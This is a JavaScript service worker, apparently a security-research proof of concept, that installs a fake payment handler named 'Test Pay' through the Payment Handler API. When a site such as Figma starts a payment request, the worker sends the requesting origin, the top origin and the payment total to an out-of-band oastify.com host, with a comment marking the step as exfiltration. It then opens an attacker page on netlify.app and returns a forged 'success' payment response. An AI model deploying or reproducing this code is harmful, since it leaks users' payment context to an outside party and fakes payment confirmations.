  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';

  self.addEventListener("install", e => {
    self.skipWaiting();
    e.waitUntil(
      self.registration.paymentManager.instruments.set("basic", {
        name: "Test Pay",
        method: "https://gleeful-creponne-8ff162.netlify.app/pay.json"
      })
    );
  });

  self.addEventListener("activate", e => e.waitUntil(clients.claim()));

  self.addEventListener("paymentrequest", e => {
    // These tell us WHERE the PaymentRequest was initiated from
    const origin = e.paymentRequestOrigin;  // e.g. "https://www.figma.com"
    const top    = e.topOrigin;             // top-level frame origin
    const total  = JSON.stringify(e.total);
    const method = e.methodName;

    // Exfil immediately — no window needed
    fetch(OOB + '/payment?origin=' + encodeURIComponent(origin) +
                '&top='    + encodeURIComponent(top) +
                '&total='  + encodeURIComponent(total),
          { mode: 'no-cors' });

    // Open handler window so we can also run JS in that context
    e.respondWith(
      e.openWindow('https://gleeful-creponne-8ff162.netlify.app/pay-handler.html')
        .then(client => {
          // client = WindowClient of the opened page
          // We can postMessage to it with figma context data
          if (client) {
            client.postMessage({
              type: 'payment_context',
              paymentRequestOrigin: origin,
              topOrigin: top,
              total: total
            });
          }
          // Must resolve with a payment response object
          return { methodName: method, details: { status: 'success' } };
        })
    );
  });
